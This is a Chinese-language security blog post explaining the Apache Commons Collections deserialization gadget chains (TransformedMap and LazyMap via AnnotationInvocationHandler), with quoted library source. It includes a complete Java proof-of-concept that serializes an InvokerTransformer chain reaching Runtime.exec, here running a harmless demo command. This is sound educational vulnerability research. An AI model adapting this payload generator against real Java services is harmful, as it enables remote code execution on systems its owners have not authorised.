---
layout: post
title: "反序列化-Apache Commons Collections"
categories: "WebSecurity"
---

#### 前言

文章涉及的几个关键点：

* java反序列化原理
* Apache Commons Collections利用链
* AnnotationInvocationHandler反序列化
* 基于TransfomedMap的调用链
* 基于LazyMap的调用链

文中复现使用的环境为jdk6，Apache Commons Collections3.1

#### java反序列化原理

在java中可以将实现了Serializable/Externalizable接口的类进行序列化，使用ObjectOutputStream.writeobject即可进行序列化操作

序列化后的数据为二进制数据流，需要关注的是序列化后的数据特征，开头为：

```
# 二进制
ac ed 00 05
# base64
rO0AB
```

而反序列化则是将二进制数据转换为对应的object，使用ObjectInputStream.readobject进行反序列化，但这里也会调用接收的序列化对象的readobject方法(如果该对象重写了此方法)，这里就是一个关键点

如果在重写的readobject中引用攻击者传入的序列化对象数据进行敏感操作也会导致安全问题，例如命令执行、文件读取等

#### Apache Commons Collections利用链

在2015年爆出Apache Commons Collections公共库中存在命令执行利用链，这样就放大了反序列漏洞的危害，同年就导致很多知名的web应用都受到影响。

这个库产生的问题只是给反序列化不安全数据，提供了一个稳定的命令执行利用链，因此要真正利用该库的漏洞需要满足以下条件：

* 目标应用的包路径下包含commons collections < 3.1版本
* readObject反序列化的数据可控

ps: 不同jdk版本对象的payload有所不同

该利用链涉及以下类：

* TransformedMap
* InvokerTransformer、ConstantTransformer
* ChainedTransformer

最终触发命令的地方为org.apache.commons.collections.functors.InvokerTransformer：

```java
public Object transform(Object input) {
    if (input == null) {
        return null;
    } else {
        try {
            Class cls = input.getClass();
            Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
            return method.invoke(input, this.iArgs);
        } catch (NoSuchMethodException var5) {
            throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' does not exist");
        } catch (IllegalAccessException var6) {
            throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
        } catch (InvocationTargetException var7) {
            throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' threw an exception", var7);
        }
    }
}
```

使用传入参数input和类中的属性，进行命令执行，构造函数如下：

```java
public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
    this.iMethodName = methodName;
    this.iParamTypes = paramTypes;
    this.iArgs = args;
}
```

org.apache.commons.collections.functors.ConstantTransformer可以理解为返回一个常量object即可：

```java
# 构造函数
public ConstantTransformer(Object constantToReturn) {
    this.iConstant = constantToReturn;
}

public Object transform(Object input) {
    return this.iConstant;
}
```

要进行利用，都需要执行其对应的transform函数，此时就引入了org.apache.commons.collections.functors.ChainedTransformer：

```java
public ChainedTransformer(Transformer[] transformers) {
    this.iTransformers = transformers;
}
public Object transform(Object object) {
    for(int i = 0; i < this.iTransformers.length; ++i) {
        object = this.iTransformers[i].transform(object);
    }
    return object;
}
```

通过在构造函数中传入以Transformer为基本数据类型的数组，调用transform会依次调用Transformer对应的transform函数

ps：这里的Transformer为ConstantTransformer和InvokerTransformer的父类，这里会将前一个Transformer执行的transform结果，当成下一个Transformer.transform参数，形成了一个链

接着需要找到可以触发ChainedTransformer.transform，同时可以控制类中的iTransformers。

本文介绍两个利用链：一个基于TransformedMap、一个基于LazyMap

#### AnnotationInvocationHandler反序列化

在介绍调用链之前，需要关注真正反序列化触发的入口点：sun.reflect.annotation.AnnotationInvocationHandler，该类存在与JDK中，以下代码为该类的readObject函数：

```java
private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
    var1.defaultReadObject();
    AnnotationType var2 = null;

    try {
        var2 = AnnotationType.getInstance(this.type);
    } catch (IllegalArgumentException var9) {
        throw new InvalidObjectException("Non-annotation type in annotation serial stream");
    }

    Map var3 = var2.memberTypes();
    Iterator var4 = this.memberValues.entrySet().iterator();		// 位置1

    while(var4.hasNext()) {
        Entry var5 = (Entry)var4.next();
        String var6 = (String)var5.getKey();
        Class var7 = (Class)var3.get(var6);
        if (var7 != null) {
            Object var8 = var5.getValue();
            if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
                var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));	// 位置2
            }
        }
    }
}
```

这里有两个可利用的触发点：

* 位置1: Iterator var4 = this.memberValues.entrySet().iterator();
* 位置2: var5.setValue()

该类中的memberValues可以通过构造该类对象并进行序列化的方式进行控制，以下为该类可控制的数据类型：

```java
AnnotationInvocationHandler(Class var1, Map<String, Object> var2) {
    this.type = var1;
    this.memberValues = var2;
}
```

位置1对应TransformedMap调用链；

位置2对应LazyMap调用链

#### 基于TransformedMap的调用链

通过org.apache.commons.collections.map.TransformedMap进行完美触发ChainedTransformer.transform：

```java
protected Object checkSetValue(Object value) {
    return this.valueTransformer.transform(value);
}
```

需要关心的是valueTransformer是否可控，对应的构造函数：

```java
public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    return new TransformedMap(map, keyTransformer, valueTransformer);
}

protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    super(map);
    this.keyTransformer = keyTransformer;
    this.valueTransformer = valueTransformer;
}
```

上述构造函数表明可以控制valueTransformer的值。

ps：这里除了可以利用checkSetValue也可以通过put方法进行触发，这里就不再展开。

再次通过org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntry#setValue即可实现触发执行checkSetValue

```java
public Object setValue(Object value) {
    value = this.parent.checkSetValue(value);
    return super.entry.setValue(value);
}
```

恰巧TransformedMap实现了该接口，this.parent即为TransformedMap本身

进行到这里得到的利用链如下：

```
TransformedMap.SetValue -> TransformedMap.checkSetValue -> ChainedTransformer.transform -> Transformer.transform -> Transformer.transform -> ...
```

ps: 上述Transformer代表InvokerTransformer、ConstantTransformer, 通过链的形式依次调用所有Transformer

按照思路需要再寻找可以触发TransformedMap.SetValue的点，此时就对应上了上节介绍的AnnotationInvocationHandler，通过位置2即可触发整个利用链，构造的payload脚本如下：

```java
import java.io.*;
import java.util.HashMap;
import java.util.Map;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.map.TransformedMap;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import java.lang.reflect.Constructor;
import java.lang.annotation.Retention;

public class deserialPoc {
    public static Object Reverse_Payload() throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class }, new Object[] { "open /Applications/Atom.app/" }) };
        Transformer transformerChain = new ChainedTransformer(transformers);

        Map innermap = new HashMap();
        innermap.put("value", "value");
        Map outmap = TransformedMap.decorate(innermap, null, transformerChain);
        //通过反射获得AnnotationInvocationHandler类对象
        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        //通过反射获得cls的构造函数
        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
        //这里需要设置Accessible为true，否则序列化失败
        ctor.setAccessible(true);
        //通过newInstance()方法实例化对象
        Object instance = ctor.newInstance(Retention.class, outmap);
        return instance;
    }

    public static void main(String[] args) throws Exception {
        GeneratePayload(Reverse_Payload(),"obj");
        payloadTest("obj");
    }

    public static void GeneratePayload(Object instance, String file)
            throws Exception {
        //将构造好的payload序列化后写入文件中
        File f = new File(file);
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
        out.writeObject(instance);
        out.flush();
        out.close();
    }

    public static void payloadTest(String file) throws Exception {
        //读取写入的payload，并进行反序列化
        ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
        in.readObject();
        in.close();
    }
}
```

#### 基于LazyMap的调用链

在Apache common collections只要可以触发ChainedTransformer.transform即可，通过"Ysoserial"利用工具可得到通过org.apache.commons.collections.LazyMap进行利用的调用链

```java
public static Map decorate(Map map, Transformer factory) {
    return new LazyMap(map, factory);
}

protected LazyMap(Map map, Transformer factory) {
    super(map);
    if (factory == null) {
        throw new IllegalArgumentException("Factory must not be null");
    } else {
        this.factory = factory;
    }
}

public Object get(Object key) {
    if (!super.map.containsKey(key)) {
        Object value = this.factory.transform(key);
        super.map.put(key, value);
        return value;
    } else {
        return super.map.get(key);
    }
}
```

可以看到在调用get函数时，当传入的key不存在时，即可触发transform的调用。但是要触发该函数执行，需要借助动态代理

最终通过Ysoserial中CommonsCollections1中的payload生成流程，可以得到以下调用链

```java
final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
```

最终会通过Proxy生成对应的动态代理：

```java
iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
```

allIfaces则对应Map数据类型的接口，ih为创建的AnnotationInvocationHandler。

因此在AnnotationInvocationHandler反序列化的位置1处调用：

```java
Iterator var4 = this.memberValues.entrySet().iterator();
```

由于memberValues为构造的Proxy类型，当调用任意函数时都会调用AnnotationInvocationHandler.invoke函数，位置1调用entrySet函数：

```java
public Object invoke(Object var1, Method var2, Object[] var3) {
    String var4 = var2.getName();		// var4为"entrySet"
    Class[] var5 = var2.getParameterTypes();
    if (var4.equals("equals") && var5.length == 1 && var5[0] == Object.class) {
        return this.equalsImpl(var3[0]);
    } else {
        assert var5.length == 0;
        if (var4.equals("toString")) {
            return this.toStringImpl();
        } else if (var4.equals("hashCode")) {
            return this.hashCodeImpl();
        } else if (var4.equals("annotationType")) {
            return this.type;
        } else {
            Object var6 = this.memberValues.get(var4);		// 触发执行get函数
            if (var6 == null) {
                throw new IncompleteAnnotationException(this.type, var4);
            } else if (var6 instanceof ExceptionProxy) {
                throw ((ExceptionProxy)var6).generateException();
            } else {
                if (var6.getClass().isArray() && Array.getLength(var6) != 0) {
                    var6 = this.cloneArray(var6);
                }
                return var6;
            }
        }
    }
}
```

这里会尝试调用get函数，获取key为"entrySet"对应的值。但key不存在则进入了触发流程：

```java
public Object get(Object key) {
    if (!super.map.containsKey(key)) {
        Object value = this.factory.transform(key);		// 触发执行链
        super.map.put(key, value);
        return value;
    } else {
        return super.map.get(key);
    }
}
```

通过：https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java即可进行复现

ps：这里也可以通过TiedMapEntry的toString方法调用getValue->map.get来进行触发

#### 碰到的坑

在jdk8的情况利用，提示以下错误：

```
java.lang.annotation.IncompleteAnnotationException: java.lang.Override missing element entrySet
at sun.reflect.annotation.AnnotationInvocationHandler.invoke(AnnotationInvocationHandler.java:81)
at com.sun.proxy.$Proxy0.entrySet(Unknown Source)
```

测试JDK7同样的问题，最后切换至JDK6成功触发

```
java.lang.ClassCastException: java.lang.Integer cannot be cast to java.util.Set
	at com.sun.proxy.$Proxy0.entrySet(Unknown Source)
```

#### 总结

反序列化的问题早在2015年就被爆出，但是有长达9个月并未获得足够的关注，后来FoxGlove Security安全团队的`@breenmachine`发布一篇博客，阐述如何利用Apache Commons Collections在实际场景中进行利用，常见的web应用几乎都中枪了

对于反序列化漏洞主要是提炼可利用的执行链，当然最初的切入点还是readObject函数

对于反序列化漏洞挖掘，个人理解：

* 应用可接收序列化数据的接口
* 获取该应用内部存在的执行链



